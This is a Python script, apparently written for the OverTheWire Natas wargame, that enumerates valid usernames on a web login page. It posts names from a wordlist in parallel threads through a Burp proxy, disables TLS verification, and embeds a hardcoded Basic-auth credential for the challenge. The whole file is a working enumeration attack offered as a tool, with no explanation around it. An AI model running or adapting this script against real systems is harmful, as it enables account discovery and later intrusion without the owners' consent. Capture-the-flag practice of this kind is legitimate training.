import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# PROXY ALL REQUESTS THROUGH BURP
proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def postRequest(s, target_url, username):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : username
    }

    headers = {
        'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
    }

    # SEND REQUEST
    r = s.post(target_url, headers=headers, data=params, verify=False, proxies=proxies)

    # CHECK IF USERNAME IS VALID
    if "This user exists." in r.text:
        return username, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/index.php'
    usernames = []
    
    # LOAD USERNAMES IN A LIST
    with open(r'.\usernames.txt', 'r') as file:
        print("[+] Loading all usernames in a list...")
        for line in file.readlines():
            username = line.strip()
            sys.stdout.write("[+] Added username %s\r" % username)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            usernames.append(username)
        
    how_many_usernames = len(usernames)
    print("[+] All set! %i usernames loaded" % how_many_usernames)

    # START THREADED EXECUTION
    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, username) for username in usernames}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()  